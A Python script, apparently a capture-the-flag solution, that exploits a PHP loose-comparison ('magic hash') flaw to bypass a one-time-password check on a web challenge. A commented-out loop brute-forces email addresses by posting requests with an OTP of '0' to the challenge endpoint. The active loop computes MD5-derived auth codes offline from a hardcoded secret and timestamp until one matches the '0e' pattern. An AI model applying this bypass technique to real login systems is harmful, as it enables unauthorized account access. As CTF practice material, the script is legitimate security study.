import requests
import string
import itertools
import time
import re
import hashlib

# url = "https://challenges.silicon-ctf.party:443/web500/index.php"
# count=1
# for email in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(3))):
#     # if count % 5 == 0:
#     #     time.sleep(1)
#     # print(f"Trying: {email}@localhost.com")
#     data = {"uname": "admin", "otp": "0", "e":f"{email}@sith.com", "id":"1"}
#     res=requests.post(url, data=data)
#     if res.status_code != 200:
#         print('\nRan into error - may need to slow down')
#         break
#     if "Incorrect OTP" in res.text:
#         pos = res.text.find("authorization_code")
#         auth_code=res.text[pos+20:pos+30]
#         print(f'Attempt {email}@sith.com ... Try #{count} ... auth code {auth_code}', end="\r")

#         if re.match(r'0+[eE]\d+$', auth_code):
#             print(f'Attempt {email}@sith.com ... Try #{count} ... auth code {auth_code}\n')
#             break
#         count+=1

#     else:
#         print(f'\n[*] Found bypass with: {email}@sith.com')
#         with open('out.html','w') as f:
#             f.write(res.text)
#         break
    
count=1
for email in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(3))):
    temp='1' + '2fdde255d49fe7fc6f3323614bb55994c55db86142df93c2e4cb11570521fe54' + '1618288256' + email+'@galacticempire.com'
    auth_code=hashlib.md5(temp.encode()).hexdigest()[:10]
    # auth_code=
    if re.match(r'0+[eE]\d+$', auth_code):
        print(f'Attempt {email}@galacticempire.com ... Try #{count} ... auth code {auth_code}\n')
        break
    count+=1

# @empire - 490
# @empire.us - 502
# @imperial.com - 1052
# @galacticempire.com - 323